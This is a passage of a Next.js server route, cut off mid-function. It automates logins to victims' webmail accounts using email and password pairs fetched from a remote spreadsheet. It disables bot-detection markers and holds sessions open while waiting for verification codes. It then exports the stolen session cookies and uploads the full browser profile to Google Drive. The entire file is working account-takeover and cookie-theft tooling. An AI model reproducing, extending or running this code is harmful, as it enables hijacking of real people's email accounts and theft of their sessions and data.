import { NextResponse } from "next/server";
import puppeteer from "puppeteer-core";
import chromium from "@sparticuz/chromium-min";
import dns from 'dns';
import { promisify } from 'util';
import axios from 'axios';
import { inspect } from 'util';
import fs from 'fs-extra'; // Added for directory deletion
import {
  localExecutablePath,
  isDev,
  userAgent,
  remoteExecutablePath,
} from "../../../../utils/utils.js"; // Corrected path
import logger from "../../../../utils/logger.js"; // Corrected path
import geminiHelper from "../../../../utils/geminiHelper.js"; // Corrected path
import { platformConfigs } from "./platforms.js";
import { keyboardNavigate } from "../../../../utils/KeyboardHandlers.js"; // Corrected path
import { uploadBrowserData } from './googledrive.mjs';

// --- Concurrency Configuration ---
// Set the maximum number of concurrent browser processes
const MAX_CONCURRENT_BROWSERS = parseInt(process.env.MAX_CONCURRENT_BROWSERS || '3', 10);
// Set to track active browser processes by browserId
const activeProcesses = new Set();
logger.info(`Concurrency limit set to ${MAX_CONCURRENT_BROWSERS}`);
// ---------------------------------

// Helper function to get column indexes
function getColumnIndexes(headers) {
  const columnIndexes = headers.reduce((acc, header, index) => {
    acc[header] = index;
    return acc;
  }, {});
  return columnIndexes;
}

// Helper function to fetch data from App Script endpoint with retry logic
import { URLSearchParams } from 'url';

async function fetchDataFromAppScript(retries = 3, timeout = 120000) {
  const appScriptUrl = process.env.SCRIPT_URL;

  const params = new URLSearchParams({
    action: 'getCookieData',
    key: process.env.SCRIPT_KEY,
  });

  for (let attempt = 1; attempt <= retries; attempt++) {
    try {
      const response = await axios.post(appScriptUrl, params, {
        timeout: timeout,
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
      });
      
      if (!response.data || !response.data.success) {
        throw new Error(`Invalid response: ${JSON.stringify(response.data)}`);
      }
      
      const responseData = response.data;
      
      if (!responseData.headers || !responseData.data) {
        throw new Error(`Missing headers or data in response: ${JSON.stringify(responseData)}`);
      }
      
      return [responseData.headers, ...responseData.data];
    } catch (error) {
      logger.error(`Attempt ${attempt} failed: ${error.message}`);
      if (attempt === retries) {
        throw new Error(`Failed to fetch data after ${retries} attempts.`);
      }
    }
  }
}

// Helper function to save data back to sheets (Using browserId)
async function updateBrowserRowData(browserId, updateObject) { // Changed identifier to browserId
  try {
    if (!browserId) {
      throw new Error("Missing browserId for updateBrowserRowData");
    }

    const appScriptUrl = process.env.SCRIPT_URL;

    const now = new Date();
    const lastRunTimestamp = now.toLocaleString('en-US', { timeZone: 'UTC' }); 

    const defaultLastJsonResponse = JSON.stringify({
      browserId,
      timestamp: now.toISOString(),
      status: updateObject.status || 'UNKNOWN',
      message: 'Default response when no specific details are available'
    });

    const params = new URLSearchParams({
      action: 'setCookieData',
      browserId: browserId, 
      key: process.env.SCRIPT_KEY,
      lastRun: lastRunTimestamp, 
      lastJsonResponse: updateObject.lastJsonResponse || defaultLastJsonResponse, 
      ...updateObject 
    });

    if (updateObject.cookieJSON) {
      params.set('cookie', updateObject.cookieJSON);
      try {
         const parsedCookies = JSON.parse(updateObject.cookieJSON);
         params.set('formattedCookie', JSON.stringify(parsedCookies, null, 2));
      } catch (parseError) {
         logger.error(`[updateBrowserRowData][${browserId}] Invalid cookieJSON: ${parseError.message}`);
         params.delete('formattedCookie');
      }
      params.delete('cookieJSON');
    }

    const logParams = { ...Object.fromEntries(params) };
    delete logParams.key;
    // Reduce log verbosity slightly for concurrent runs
    logger.debug(`[updateBrowserRowData][${browserId}] Updating sheet with data: ${JSON.stringify(logParams)}`);


    const response = await axios.post(appScriptUrl, params, {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      timeout: 60000,
    });

    if (!response.data || !response.data.success) {
       const errorMsg = response.data?.error || 'Unknown App Script error';
       const errorDetails = response.data?.details ? JSON.stringify(response.data.details) : '';
       logger.error(`[updateBrowserRowData][${browserId}] App Script failed: ${errorMsg} ${errorDetails}`);
       throw new Error(`App Script update failed (using browserId): ${errorMsg}`);
    }

    logger.info(`[updateBrowserRowData][${browserId}] Sheet updated successfully.`);
    return response.data;
  } catch (error) {
    const errorMessage = error.response ? JSON.stringify(error.response.data) : error.message;
    logger.error(`[updateBrowserRowData][${browserId}] Failed to update sheet: ${errorMessage}`);
    throw new Error(`Failed to update sheet: ${errorMessage}`);
  }
}

const resolveMx = promisify(dns.resolveMx);

export const maxDuration = 60; // Vercel timeout for Serverless Functions (adjust if needed)
export const dynamic = "force-dynamic";
export const runtime = 'nodejs';

async function checkAccountAccess(browser, page, email, password, platform) { 
    const originalPage = page; 
    let emailExists = false;
    let accountAccess = false;
    let reachedInbox = false;
    let requiresVerification = false;
    // Attempt to get a unique identifier for the browser instance for logging
    const instanceId = `pid-${browser.process()?.pid || 'unknown'}`; 

    try {
        const platformConfig = platformConfigs[platform] || {}; 
        if (!platformConfig.url) {
            throw new Error(`No URL defined for platform: ${platform}`);
        }
        await originalPage.goto(platformConfig.url, { waitUntil: 'networkidle0', timeout: 20000 }); 
        logger.info(`[checkAccountAccess][${instanceId}] Starting flow for platform ${platform}.`); 

        for (const step of platformConfig.flow || []) {
            try {
                 if (step.action === 'waitForSelector') { 
                    logger.debug(`[checkAccountAccess][${instanceId}] Waiting for selector: ${step.selector}`);
                    await page.waitForSelector(step.selector, { visible: true, timeout: step.timeout || 15000 });
                    logger.debug(`[checkAccountAccess][${instanceId}] Found selector: ${step.selector}`);
                    continue; 
                }
                if (step.action === 'wait') {
                    logger.info(`[checkAccountAccess][${instanceId}] Performing explicit wait: ${step.duration || 3000}ms`);
                    await new Promise(res => setTimeout(res, step.duration || 3000));
                    continue;
                }
                if (!step.selector) continue;

                let resolvedSelector = step.selector;
                if (
                  platformConfig &&
                  platformConfig.selectors &&
                  typeof step.selector === 'string' &&
                  platformConfig.selectors[step.selector]
                ) {
                  resolvedSelector = platformConfig.selectors[step.selector];
                }

                if (step.action === 'type') {
                    const value = step.value === 'EMAIL' ? email : (step.value === 'PASSWORD' ? password : step.value);
                    const logValue = step.value === 'PASSWORD' ? '*****' : value;
                    logger.debug(`[checkAccountAccess][${instanceId}] Typing '${logValue}' into ${resolvedSelector}`);
                    try { await originalPage.bringToFront(); } catch(e) { logger.warn(`[bringToFront Pre-Type][${instanceId}] Error: ${e.message}`); } 
                    await page.waitForSelector(resolvedSelector, { visible: true, timeout: 15000 });
                    await page.evaluate((selector) => {
                        const element = document.querySelector(selector);
                        if (element) {
                            element.scrollIntoView({ behavior: 'auto', block: 'center', inline: 'center' });
                            element.value = '';
                        }
                    }, resolvedSelector);
                    await page.type(resolvedSelector, value, { delay: 25 });
                    // Only wait if a specific delay is provided in the step config
                    if (step.delay && typeof step.delay === 'number' && step.delay > 0) {
                        logger.info(`[checkAccountAccess][${instanceId}] Performing explicit step delay: ${step.delay}ms`);
                        await new Promise(res => setTimeout(res, step.delay));
                    }
                 } else if (step.action === 'click') {
                    let clicked = false;
                    if (typeof resolvedSelector === 'function') {
                        logger.info(`[checkAccountAccess][${instanceId}] Invoking custom click handler for ${step.selector}`); 
                        await resolvedSelector(page, platformConfig.selectors); 
                        clicked = true;
                    } else {
                        let selectorsToAttempt = Array.isArray(resolvedSelector) ? resolvedSelector : [resolvedSelector];
                        
                        if (selectorsToAttempt.length > 0) {
                            logger.info(`[checkAccountAccess][${instanceId}] Attempting to find and click one of selector(s): ${JSON.stringify(selectorsToAttempt)}`);
                            try {
                                const firstVisibleSelectorPromise = Promise.race(
                                    selectorsToAttempt.map(sel =>
                                        page.waitForSelector(sel, { visible: true, timeout: 5000 })
                                            .then(() => sel) // When found, resolve with the selector string
                                    )
                                );

                                const firstVisibleSelector = await firstVisibleSelectorPromise;
                                logger.info(`[checkAccountAccess][${instanceId}] First visible selector found: ${firstVisibleSelector}`);

                                // Now attempt to click the selector that was found first
                                try { await originalPage.bringToFront(); } catch(e) { logger.warn(`[bringToFront Pre-Click][${instanceId}] Error: ${e.message}`); }
                                
                                const navigationPromise = page.waitForNavigation({ 
                                    waitUntil: 'networkidle0', 
                                    timeout: 10000 
                                }).catch(() => null);
                                
                                await page.click(firstVisibleSelector);
                                await navigationPromise;
                                logger.info(`[checkAccountAccess][${instanceId}] Clicked on selector: ${firstVisibleSelector}`);
                                clicked = true;
                                try { await originalPage.bringToFront(); } catch(e) {/* ignore if page closed */}
                            } catch (raceError) {
                                // This error means Promise.race rejected (all waitForSelector timed out or other error during race)
                                logger.warn(`[checkAccountAccess][${instanceId}] None of the selectors ${JSON.stringify(selectorsToAttempt)} were found and visible within the timeout. Error: ${raceError.message}`);
                                // Explicitly throw the critical failure error here
                                throw new Error(`Critical click failure: None of the selectors ${JSON.stringify(selectorsToAttempt)} were found. Original error: ${raceError.message}`);
                            }
                        }
                    } // End of standard click logic
                    
                    // Removed the separate (!clicked) check here, as failure is thrown in catch(raceError) now
                    // Removed fixed 2000ms wait after click

                    if (platformConfig?.additionalViews) {
                        for (const view of platformConfig.additionalViews) {
                            try {
                                await page.waitForFunction(() => {
                                    return document.readyState === 'complete';
                                }, { timeout: 5000 }).catch(() => null);

                                const matchFound = await page.evaluate((viewData) => {
                                    try {
                                        const selectors = Array.isArray(viewData.match.selector) ? 
                                            viewData.match.selector : [viewData.match.selector];
                                            
                                        for (const sel of selectors) {
                                            const element = document.querySelector(sel);
                                            if (element) {
                                                return !viewData.match.text || 
                                                    element.textContent.includes(viewData.match.text);
                                            }
                                        }
                                    } catch (e) {}
                                    return false;
                                }, view).catch(() => false);

                                if (matchFound) {
                                    logger.info(`[Modal Handler][${instanceId}] Processing view: ${view.name}`);
                                    
                                    if (view.action?.type === 'click') {
                                        const selectors = Array.isArray(view.action.selector) ? 
                                            view.action.selector : [view.action.selector];
                                        
                                        for (const selector of selectors) {
                                            try {
                                                await page.waitForSelector(selector, { visible: true, timeout: 3000 });
                                                await page.click(selector);
                                                // Removed fixed 2000ms wait after modal click
                                                break;
                                            } catch (modalClickError) {
                                                continue;
                                            }
                                        }
                                    }
                                }
                            } catch (viewError) {
                                logger.error(`[checkAccountAccess][${instanceId}] View handling error for ${view.name}: ${viewError.message}`); 
                            }
                        }
                    }
                }

                const originalSelectorName = step.selector; 

                if (platformConfig && platformConfig.selectors) {
                    // Check for email error *after* attempting to submit the email
                    if (originalSelectorName === 'nextButton' && platformConfig.selectors.errorMessage) {
                         logger.debug(`[checkAccountAccess][${instanceId}] Checking for email error message...`);
                        const errorExists = await page.evaluate((xpath) => {
                            try { 
                                const result = document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null);
                                return !!result.singleNodeValue;
                            } catch (e) { return false; }
                        }, platformConfig.selectors.errorMessage).catch(() => false); 

                        if (errorExists) {
                            logger.info(`[checkAccountAccess][${instanceId}] Email error detected. Email does not exist.`); 
                            return { emailExists: false, accountAccess: false, reachedInbox: false, requiresVerification: false };
                        } else {
                            logger.info(`[checkAccountAccess][${instanceId}] No email error detected. Checking if already in inbox...`); 
                            emailExists = true; 

                            const alreadyInbox = await isInbox(page, platformConfig);
                            if (alreadyInbox) {
                                logger.info(`[checkAccountAccess][${instanceId}] Already in inbox after email submission. Skipping password.`);
                                return { emailExists: true, accountAccess: true, reachedInbox: true, requiresVerification: false };
                            }
                        }
                    }

                    // Check for login failure *after* attempting to submit the password
                    if (originalSelectorName === 'passwordNextButton' && platformConfig.selectors.loginFailed) {
                         logger.debug(`[checkAccountAccess][${instanceId}] Checking for login failure message...`);
                        const failExists = await page.evaluate((xpath) => {
                             try { 
                                const result = document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null);
                                return !!result.singleNodeValue;
                             } catch (e) { return false; }
                        }, platformConfig.selectors.loginFailed).catch(() => false); 
                        
                        if (failExists) {
                            logger.info(`[checkAccountAccess][${instanceId}] Login failed detected after password next.`); 
                            accountAccess = false;
                            reachedInbox = false; 
                            return { emailExists, accountAccess, reachedInbox, requiresVerification }; 
                        } else {
                            logger.info(`[checkAccountAccess][${instanceId}] No login failure detected.`); 
                            accountAccess = true; 
                        }
                    } else if (originalSelectorName === 'passwordNextButton' && !platformConfig.selectors.loginFailed) {
                         logger.info(`[checkAccountAccess][${instanceId}] No login failure check configured, assuming access potentially successful.`); 
                         accountAccess = true;
                    }
                }

            } catch (stepError) {
                // Log the specific step error first
                logger.error(`[checkAccountAccess][${instanceId}] Step error during action '${step.action}' for selector '${step.selector}': ${stepError.message}`, stepError);
                
                // Check if it's a critical failure that requires immediate return
                let isCritical = false;
                const failedStepSelectorKey = step.selector; // The key from the flow, e.g., "input", "passwordInput"

                // If typing into the field identified by 'input' (presumably email) fails
                if (step.action === 'type' && failedStepSelectorKey === 'input' && stepError.message.startsWith('Type action failed:')) {
                    isCritical = true;
                    logger.warn(`[checkAccountAccess][${instanceId}] Critical failure: Typing into email field ('${failedStepSelectorKey}') failed. Error: ${stepError.message}`);
                }
                // If typing into the field identified by 'passwordInput' fails
                else if (step.action === 'type' && failedStepSelectorKey === 'passwordInput' && stepError.message.startsWith('Type action failed:')) {
                    isCritical = true;
                    logger.warn(`[checkAccountAccess][${instanceId}] Critical failure: Typing into password field ('${failedStepSelectorKey}') failed. Error: ${stepError.message}`);
                }
                // If a click action designated as critical fails
                else if (stepError.message.startsWith('Critical click failure')) {
                    isCritical = true;
                    // The error message itself from the click action already indicates criticality.
                }
                // Note: A failure of `action: 'waitForSelector'` (even for 'passwordInput' key) is no longer automatically critical here.

                 if (isCritical) {
                     // Log the reason for returning failure (already logged if specific conditions above met)
                     // logger.warn(`[checkAccountAccess][${instanceId}] Returning failure due to critical step error: ${stepError.message}`);
                     // Return the failure state, preserving emailExists status if known
                     return { emailExists: emailExists, accountAccess: false, reachedInbox: false, requiresVerification: false };
                 }
                 // For other non-critical errors
                 logger.warn(`[checkAccountAccess][${instanceId}] Non-critical step error encountered. Continuing flow.`);
            }
        } 

        logger.info(`[checkAccountAccess][${instanceId}] Flow completed. Current state: emailExists=${emailExists}, accountAccess=${accountAccess}`);

        // Check for verification views *after* the entire flow attempt
        if (emailExists && accountAccess) {
             logger.debug(`[checkAccountAccess][${instanceId}] Checking for verification page...`);
            requiresVerification = await checkVerification(page, platformConfig);
            logger.debug(`[checkAccountAccess][${instanceId}] Verification check result: ${requiresVerification}`);
            if (requiresVerification) {
                // Don't check inbox if verification is needed
                return { emailExists: true, accountAccess: true, reachedInbox: false, requiresVerification: true };
            }
        }

        // Check inbox state *only* if login succeeded and no verification is needed
        reachedInbox = false; // Reset default
        if (emailExists && accountAccess && !requiresVerification) {
             logger.debug(`[checkAccountAccess][${instanceId}] Final check if inbox reached...`);
            reachedInbox = await isInbox(page, platformConfig);
            logger.debug(`[checkAccountAccess][${instanceId}] Final inbox check result: ${reachedInbox}`);
        }

         logger.info(`[checkAccountAccess][${instanceId}] Returning final state: ${JSON.stringify({ emailExists, accountAccess, reachedInbox, requiresVerification })}`); 
        return { emailExists, accountAccess, reachedInbox, requiresVerification };
    } catch (err) {
        logger.error(`[checkAccountAccess][${instanceId}] Unexpected error during account check for ${email}: ${err.message}`, err); 
        return { 
            emailExists: false, 
            accountAccess: false, 
            reachedInbox: false,
            requiresVerification: false,
            error: err.message 
        };
    } 
}

async function isInbox(page, platformConfig) {
    const instanceId = `pid-${page.browser().process()?.pid || 'unknown'}`;
    try {
        // Check URL patterns if configured
        if (platformConfig.inboxUrlPatterns) {
            const currentUrl = page.url();
            for (const pattern of platformConfig.inboxUrlPatterns) {
                if (pattern.test(currentUrl)) {
                    logger.debug(`[isInbox][${instanceId}] Inbox detected via URL pattern: ${pattern}`);
                    return true;
                }
            }
        }

        // Check DOM selectors if configured
        if (platformConfig.inboxDomSelectors) {
            for (const selector of platformConfig.inboxDomSelectors) {
                try {
                    if (typeof selector === 'string') {
                        await page.waitForSelector(selector, { timeout: 5000 });
                        logger.debug(`[isInbox][${instanceId}] Inbox detected via DOM selector: ${selector}`);
                        return true;
                    } else if (typeof selector === 'object') {
                        const element = await page.waitForSelector(selector.selector, { timeout: 5000 });
                        if (selector.text) {
                            const text = await page.evaluate(el => el.textContent, element);
                            if (text.includes(selector.text)) {
                                logger.debug(`[isInbox][${instanceId}] Inbox detected via DOM selector with text: ${selector.selector}`);
                                return true;
                            }
                        } else {
                             logger.debug(`[isInbox][${instanceId}] Inbox detected via DOM selector: ${selector.selector}`);
                            return true;
                        }
                    }
                } catch (e) {
                    // Selector not found, continue to next one
                    continue;
                }
            }
        }
        
        logger.debug(`[isInbox][${instanceId}] Inbox not detected.`);
        return false;
    } catch (error) {
        logger.error(`[isInbox][${instanceId}] Error checking inbox:`, error);
        return false;
    }
}

async function checkVerification(page, platformConfig) {
    if (!platformConfig?.additionalViews) return false;
    const instanceId = `pid-${page.browser().process()?.pid || 'unknown'}`;
    logger.debug(`[Verification Check][${instanceId}] Starting verification check...`);

    for (const view of platformConfig.additionalViews) {
        if (!view.requiresVerification) continue;

        try {
            logger.debug(`[Verification Check][${instanceId}] Checking view: ${view.name}`);
            const matchFound = await page.evaluate((viewData) => {
                const selectors = Array.isArray(viewData.match.selector) ? 
                    viewData.match.selector : [viewData.match.selector];
                    
                for (const sel of selectors) {
                    const element = document.querySelector(sel);
                    if (element) {
                        return !viewData.match.text || 
                            element.textContent.includes(viewData.match.text);
                    }
                }
                return false;
            }, view).catch(() => false);

            if (matchFound) {
                logger.info(`[Verification Check][${instanceId}] Verification view matched: ${view.name}`);
                return true; // Indicate *some* form of verification is required
            }

            // Optional: AI analysis if traditional selectors fail (keep commented out unless needed)
            /*
            logger.debug(`[Verification Check][${instanceId}] Traditional selector check failed for ${view.name}, trying AI analysis...`);
            const analysis = await geminiHelper.analyzePageContent(
                page,
                view.match.selector,
                'verification'
            );

            if (analysis.found || analysis.pageState === 'verification') {
                logger.info(`[Verification Check][${instanceId}] Verification detected through analysis for ${view.name}`);
                return true;
            }
            */
        } catch (error) {
            logger.error(`[Verification Check][${instanceId}] Error during verification check for view ${view.name}:`, error);
        }
    }

    // Only if no verification view was matched, check if we're already in inbox
    try {
        const isInInboxPage = await isInbox(page, platformConfig);
        if (isInInboxPage) {
            logger.debug(`[Verification Check][${instanceId}] Already in inbox, no verification needed.`);
            return false;
        }
    } catch (error) {
        logger.error(`[Verification Check][${instanceId}] Error checking inbox status:`, error); 
    }

    logger.debug(`[Verification Check][${instanceId}] No verification required based on views.`);
    return false;
}

const setCorsHeaders = (response) => {
  response.headers.set("Access-Control-Allow-Origin", "*");
  response.headers.set("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  response.headers.set("Access-Control-Allow-Headers", "Content-Type");
  return response;
};

// GET endpoint remains largely the same, as it processes a single browserId from the request
export async function GET(request) {
  const url = new URL(request.url);
  const browserId = url.searchParams.get("browserId");

  if (!browserId) {
    return NextResponse.json({ error: "Missing browserId parameter" }, { status: 400 });
  }

  // Check if this browserId is already being processed by the interval job
  if (activeProcesses.has(browserId)) {
      logger.warn(`[GET] BrowserId ${browserId} is currently being processed by the background task. Skipping GET request.`);
      return setCorsHeaders(NextResponse.json({
          status: "PROCESSING", // Indicate it's already being handled
          message: "Process already running in background."
      }, { status: 200 }));
  }

  let browser = null;
  let page = null;
  let targetCreatedListener = null;
  let platform = 'unknown';
  let browserFullyClosed = false;
  const userDataDir = `users_data/${browserId}`;
  let updateData = {}; // To store data for final sheet update
  let finalStatusDetails = {}; // To store details from checkAccountAccess

  try {
    const data = await fetchDataFromAppScript();
    
    const headers = data[0];
    const columnIndexes = getColumnIndexes(headers);
    const rows = data.slice(1);
    const row = rows.find(r => r[columnIndexes['browserId']] === browserId);

    if (!row) {
      return NextResponse.json({ error: "Browser ID not found" }, { status: 404 });
    }

    const email = row[columnIndexes['email']];
    const password = row[columnIndexes['password']];
    const currentStatus = row[columnIndexes['status']];
    const driveUrlFromSheet = row[columnIndexes['driveUrl']]; // Req 2

    // Req 2: If already logged in and uploaded, skip
    if (currentStatus === "COMPLETED" && driveUrlFromSheet) {
      logger.info(`[GET] BrowserId ${browserId} is already COMPLETED with a Drive URL. Skipping.`);
      return setCorsHeaders(NextResponse.json({
        status: "COMPLETED",
        message: "Already processed and uploaded.",
        driveUrl: driveUrlFromSheet,
        lastJsonResponse: row[columnIndexes['lastJsonResponse']] 
      }, { status: 200 }));
    }

    // Allow GET to process even if not WAITING, but log it.
    if (currentStatus !== "WAITING") {
       logger.warn(`[GET] Processing browserId ${browserId} via GET request, but status is ${currentStatus} (expected WAITING).`);
    } else {
       logger.info(`[GET] Processing browserId ${browserId} with status WAITING.`);
    }

    // Add to active processes immediately for GET requests too
    activeProcesses.add(browserId);
    logger.info(`[GET] Added ${browserId} to active processes. Count: ${activeProcesses.size}`);

    await updateBrowserRowData(browserId, { status: "PROCESSING" });
      
    browser = await puppeteer.launch({
      ignoreDefaultArgs: ["--enable-automation"],
      args: isDev
        ? [
            "--disable-blink-features=AutomationControlled",
            "--disable-features=site-per-process",
            "-disable-site-isolation-trials",
          ]
        : [...chromium.args, "--disable-blink-features=AutomationControlled"],
      defaultViewport: { width: 1920, height: 1080 },
      executablePath: isDev
        ? localExecutablePath
        : await chromium.executablePath(remoteExecutablePath),
      headless: false, // Consider true ('new') for serverless unless debugging
      userDataDir,
    });

    const allPages = await browser.pages();
    page = allPages[0];
    
    for (let i = 1; i < allPages.length; i++) { 
      if (!allPages[i].isClosed()) {
          try { await allPages[i].close(); } catch (closeErr) { logger.warn(`[Initial Tab Cleanup][${browserId}] Error closing tab: ${closeErr.message}`); }
      }
    }
    
    targetCreatedListener = async (target) => {
      if (target.type() === 'page') {
        const newPage = await target.page();
        if (newPage && newPage !== page && !newPage.isClosed()) { 
          logger.info(`[Tab Listener][${browserId}] Detected and closing new tab: ${target.url()}`);
          try {
            await newPage.close();
          } catch (closeErr) {
            logger.warn(`[Tab Listener][${browserId}] Error closing new tab: ${closeErr.message}`);
          }
        }
      }
    };
    browser.on('targetcreated', targetCreatedListener);

    await page.setUserAgent(userAgent);
    await page.setViewport({ width: 1920, height: 1080 });

    const domain = email.split('@')[1].toLowerCase();
    const mxRecords = await resolveMx(domain).catch(() => []);
    
    platform = Object.keys(platformConfigs).find(key => {
        const config = platformConfigs[key];
        return config.mxKeywords && config.mxKeywords.some(kw => domain.includes(kw) || mxRecords.some(mx => mx.exchange && mx.exchange.includes(kw)));
    }) || 'unknown';
    
    const checkResult = await checkAccountAccess(browser, page, email, password, platform);
    let newStatus = "FAILED"; 
    if (checkResult.emailExists && checkResult.accountAccess) {
      newStatus = checkResult.requiresVerification ? "WAITINGCODE" : "COMPLETED";
    }

    finalStatusDetails = { // Store details for JSON response
      browserId,
      email,
      status: newStatus, // This will be updated if COMPLETED and upload happens
      emailExists: checkResult.emailExists,
      accountAccess: checkResult.accountAccess,
      reachedInbox: checkResult.reachedInbox,
      requiresVerification: checkResult.requiresVerification,
      platform,
      timestamp: new Date().toISOString()
    };
    
    updateData = { status: newStatus, lastJsonResponse: JSON.stringify(finalStatusDetails) };
          
    if (newStatus === "COMPLETED") {
      const cookies = await page.cookies();
      updateData.cookieJSON = JSON.stringify(cookies); // For final update with Drive URL

      // Req 3: Update status to COMPLETED (without Drive URL yet)
      logger.info(`[GET][${browserId}] Setting status to COMPLETED before Drive upload.`);
      await updateBrowserRowData(browserId, {
          status: "COMPLETED",
          cookieJSON: updateData.cookieJSON, // Ensure cookie is sent in this intermediate update
          lastJsonResponse: JSON.stringify(finalStatusDetails) // finalStatusDetails already has COMPLETED status
      });

      if (browser) {
        if (targetCreatedListener) browser.off('targetcreated', targetCreatedListener);
        logger.info(`[GET][${browserId}] Closing browser for COMPLETED status before Drive upload.`);
        await browser.close().catch(err => logger.error(`Error closing browser for ${browserId}: ${err.message}`));
        browserFullyClosed = true;
        await new Promise(resolve => setTimeout(resolve, 1000));
      }

      let uploadedDriveUrl = null;
      try {
        uploadedDriveUrl = await uploadBrowserData(browserId);
        if (uploadedDriveUrl) {
          updateData.driveUrl = uploadedDriveUrl;
          logger.info(`[GET][${browserId}] Successfully uploaded browser data to Google Drive.`);
        } else {
          logger.warn(`[GET][${browserId}] Google Drive upload skipped or failed.`);
        }
      } catch (uploadError) {
        logger.error(`[GET][${browserId}] Error during Google Drive upload: ${uploadError.message}`);
      }
      // updateData (status, cookieJSON, driveUrl, lastJsonResponse) is now ready for final sheet update
    }

    // Final sheet update for all statuses (FAILED, WAITINGCODE, or COMPLETED with Drive URL)
    await updateBrowserRowData(browserId, updateData);

    // Req 4: Delete userDataDir if COMPLETED and driveUrl exists
    if (updateData.status === "COMPLETED" && updateData.driveUrl && userDataDir) {
      try {
        logger.info(`[GET][${browserId}] Process COMPLETED and uploaded. Deleting user data directory: ${userDataDir}`);
        await fs.remove(userDataDir);
        logger.info(`[GET][${browserId}] Successfully deleted user data directory: ${userDataDir}`);
      } catch (deleteError) {
        logger.error(`[GET][${browserId}] Error deleting user data directory after completion: ${deleteError.message}`);
      }
    }

    return setCorsHeaders(NextResponse.json({
      status: updateData.status,
      emailExists: finalStatusDetails.emailExists, 
      accountAccess: finalStatusDetails.accountAccess, 
      requiresVerification: finalStatusDetails.requiresVerification,
      reachedInbox: finalStatusDetails.reachedInbox,
      driveUrl: updateData.driveUrl || null,
      lastJsonResponse: updateData.lastJsonResponse
    }, { status: 200 }));

  } catch (error) {
    logger.error(`[GET][${browserId}] Error processing request: ${error.message}`, error);
    // Ensure a FAILED status is updated if an unexpected error occurs
    if (browserId && updateData.status !== "FAILED") { // Avoid double update if already FAILED
        updateData.status = "FAILED";
        updateData.lastJsonResponse = JSON.stringify({
            browserId, status: "FAILED", error: error.message, timestamp: new Date().toISOString()
        });
        try {
            await updateBrowserRowData(browserId, updateData);
        } catch (sheetUpdateError) {
            logger.error(`[GET][${browserId}] Critical error: Failed to update sheet to FAILED after error: ${sheetUpdateError.message}`);
        }
    }
    return NextResponse.json({ error: error.message }, { status: 500 });
  } finally {
    const finalEffectiveStatus = updateData?.status;

    if (browser && !browserFullyClosed) {
      if (targetCreatedListener) browser.off('targetcreated', targetCreatedListener);
      
      if (finalEffectiveStatus !== "WAITINGCODE") { // Keep open for WAITINGCODE
        logger.info(`[GET][${browserId}] Final cleanup - Closing browser (status: ${finalEffectiveStatus})`);
        await browser.close().catch(err => logger.error(`Error closing browser during cleanup for ${browserId}: ${err.message}`));
        browserFullyClosed = true; // Mark as closed
        await new Promise(resolve => setTimeout(resolve, 1000));
      } else {
        logger.info(`[GET][${browserId}] Keeping browser open as it is in WAITINGCODE state.`);
      }
    }

    // Req 1: If login failed (status is FAILED), delete userDataDir
    if (finalEffectiveStatus === "FAILED" && userDataDir) {
      if (browserFullyClosed || !browser?.isConnected?.()) { // Ensure browser is closed
          try {
              logger.info(`[GET][${browserId}] Login failed. Deleting user data directory: ${userDataDir}`);
              await fs.remove(userDataDir);
              logger.info(`[GET][${browserId}] Successfully deleted user data directory: ${userDataDir}`);
          } catch (deleteError) {
              logger.error(`[GET][${browserId}] Error deleting user data directory (failed login): ${deleteError.message}`);
          }
      } else {
          logger.warn(`[GET][${browserId}] Login failed, but browser not confirmed closed. Skipping userDataDir deletion.`);
      }
    }
    // Remove from active processes set when GET request finishes
    if (activeProcesses.has(browserId)) {
        activeProcesses.delete(browserId);
        logger.info(`[GET] Removed ${browserId} from active processes. Count: ${activeProcesses.size}`);
    }
  }
}


async function processRow(row, columnIndexes) {
  const browserId = row[columnIndexes['browserId']];
  const email = row[columnIndexes['email']];
  const password = row[columnIndexes['password']];
  // const initialSheetStatus = row[columnIndexes['status']]; // Status is checked before calling
  // const driveUrlFromSheet = row[columnIndexes['driveUrl']]; // Checked before calling
  logger.info(`[processRow][${browserId}] Processing row.`);

  await updateBrowserRowData(browserId, { status: "PROCESSING" });

  const userDataDir = `users_data/${browserId}`;
  let browser = null;
  let page = null;
  let targetCreatedListener = null;
  let finalStatus = "FAILED"; 
  let updateData = { status: finalStatus }; // This will be the object for the *final* sheet update
  let browserFullyClosed = false;
  let platform = 'unknown'; // Initialize platform
  let initialCheckResult = {}; // Store initial checkAccountAccess result

  try {
    browser = await puppeteer.launch({
        ignoreDefaultArgs: ["--enable-automation"],
        args: isDev
          ? [ "--disable-blink-features=AutomationControlled", "--disable-features=site-per-process", "-disable-site-isolation-trials" ]
          : [...chromium.args, "--disable-blink-features=AutomationControlled"],
        defaultViewport: { width: 1920, height: 1080 },
        executablePath: isDev ? localExecutablePath : await chromium.executablePath(remoteExecutablePath),
        headless: false, // Consider true ('new') for serverless unless debugging
        userDataDir,
      });

      const allPages = await browser.pages();
      page = allPages[0];

      for (let i = 1; i < allPages.length; i++) { 
        if (!allPages[i].isClosed()) {
            try { await allPages[i].close(); } catch (closeErr) { logger.warn(`[Initial Tab Cleanup][${browserId}] Error closing tab: ${closeErr.message}`); }
        }
      }

      targetCreatedListener = async (target) => {
        if (target.type() === 'page') {
          const newPage = await target.page();
          if (newPage && newPage !== page && !newPage.isClosed()) {
            logger.info(`[Tab Listener][${browserId}] Detected and closing new tab: ${target.url()}`);
            try { await newPage.close(); } catch (closeErr) { logger.warn(`[Tab Listener][${browserId}] Error closing new tab: ${closeErr.message}`); }
          }
        }
      };
      browser.on('targetcreated', targetCreatedListener);

      await page.setUserAgent(userAgent);
      await page.setViewport({ width: 1920, height: 1080 });

      const domain = email.split('@')[1].toLowerCase();
      const mxRecords = await resolveMx(domain).catch(() => []);
      
      let matchedPlatformKey = Object.keys(platformConfigs).find(key => {
          const config = platformConfigs[key];
          return config.mxKeywords && config.mxKeywords.some(kw => domain.includes(kw) || mxRecords.some(mx => mx.exchange && mx.exchange.includes(kw)));
      });
      platform = matchedPlatformKey || 'unknown';
      
      initialCheckResult = await checkAccountAccess(browser, page, email, password, platform);

      if (!initialCheckResult.emailExists) {
          finalStatus = "FAILED";
      } else if (initialCheckResult.accountAccess && !initialCheckResult.requiresVerification) {
